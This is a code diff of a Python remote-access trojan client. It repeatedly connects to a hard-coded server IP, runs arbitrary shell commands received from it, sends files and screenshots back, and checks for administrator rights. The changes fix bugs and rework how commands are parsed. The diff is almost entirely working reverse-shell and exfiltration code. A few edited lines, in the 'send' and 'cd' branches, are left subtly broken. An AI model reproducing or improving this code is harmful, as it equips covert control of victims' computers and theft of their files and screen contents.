@@ -13,8 +13,13 @@ import sys
 import shutil
 from PIL import ImageGrab
 import tempfile
-import winreg as wrg
 import hashlib
+
+# Fails to import on Linux
+try:
+    import winreg as wrg
+except ImportError:
+    pass
 
 ip = "172.25.191.60"
 port = 8080
@@ -47,15 +52,18 @@ def sendFile(mySocket, path):
                 fileHash.update(packet)
                 mySocket.send(packet)
         mySocket.send('DONE'.encode())
-        hexdigest = file_hash.hexdigest()
+        hexdigest = fileHash.hexdigest()
+        returnPacket = ''
+        while returnPacket != 'READY':
+            returnPacket = mySocket.recv(chunksize).decode()
         mySocket.send(hexdigest.encode())
 
     except FileNotFoundError:
-        socket.send('File not found'.encode())
+        mySocket.send('File not found'.encode())
     except Exception as e:
-        socket.send('ERROR'.encode())
+        mySocket.send('ERROR'.encode())
         informToServer = "[+] Some error occured. " + str(e)
-        socket.send(informToServer.encode())
+        mySocket.send(informToServer.encode())
 
 
 def initiate():
@@ -71,7 +79,6 @@ def tuneConnection():
             shell(mySocket)
         except:
             mySocket.close()
-            pass 
         time.sleep(20)
 
 def letGrab(mySocket, path):
@@ -112,9 +119,10 @@ def isAdmin() -> bool:
 
 def shell(mySocket):
     while True:
-        command = mySocket.recv(5000)
+        command = mySocket.recv(chunksize).decode()
+        commandList = command.split()
 
-        if 'terminate' in command.decode():
+        if 'terminate' == commandList[0]:
             try:
                 mySocket.close()
                 break
@@ -123,7 +131,7 @@ def shell(mySocket):
                 mySocket.send(informToServer.encode())
                 break
 
-        elif 'checkUserLevel' in command.decode():
+        elif 'checkUserLevel' == commandList[0]:
             try:
                 if isAdmin():
                     informToServer = '[!] Administrator Privileges'
@@ -134,17 +142,17 @@ def shell(mySocket):
                 informToServer = "[+] Some error occured. " + str(e)
                 mySocket.send(informToServer.encode())
 
-        # command format: grab*,file Path>
-        # example: grab*C:\Users\John\Desktop\photo.jpeg
-        elif 'grab' in command.decode():
-            grab, path = command.decode().split("*")
+        # Command format: grab <file Path>
+        # Example: grab C:\Users\user\Desktop\photo.jpeg
+        elif 'grab' == commandList[0]:
+            path = " ".join(commandList[1:])
             try:
-                transfer(s, path)
+                sendFile(mySocket, path)
             except Exception as e:
                 informToServer = "[+] Some error occured. " + str(e)
                 mySocket.send(informToServer.encode())
 
-        elif 'screencap' in command.decode():
+        elif 'screencap' == commandList[0]:
             # Create a temp dir to store our screenshot file
             # Sample dirpath: C:\Users\pulama\AppData\Local\Temp\tmp8dfj57ox
             dirpath = tempfile.mkdtemp()
@@ -159,7 +167,7 @@ def shell(mySocket):
 
         #command format: send*<destination path>*<File Name>
         # example: send*C:\Users\John\Desktop\*photo.jpeg 
-        elif 'send' in command.decode():
+        elif 'send' == commandList[0]:
             send, path, fileName = command.decode().split("*")
             try:
                 letSend(mySocket, path, fileName)
@@ -172,7 +180,7 @@ def shell(mySocket):
         #split using the space between 'cd' and path name
         #(because, path name also may have spaces, that confuses the script)
         #and explicitly tell the operating system to change the directory
-        elif 'cd' in command.decode():
+        elif 'cd' == commandList[0]:
             try:
                 code, directory = command.decode().split(" ", 1)
                 os.chdir(directory)
@@ -183,7 +191,7 @@ def shell(mySocket):
                 mySocket.send(informToServer.encode())
 
         else:
-            CMD = subprocess.Popen(command.decode(), shell=True, stdin = subprocess.PIPE,
+            CMD = subprocess.Popen(command, shell=True, stdin = subprocess.PIPE,
                                   stdout = subprocess.PIPE, stderr = subprocess.PIPE)
             mySocket.send(CMD.stderr.read())
             mySocket.send(CMD.stdout.read())
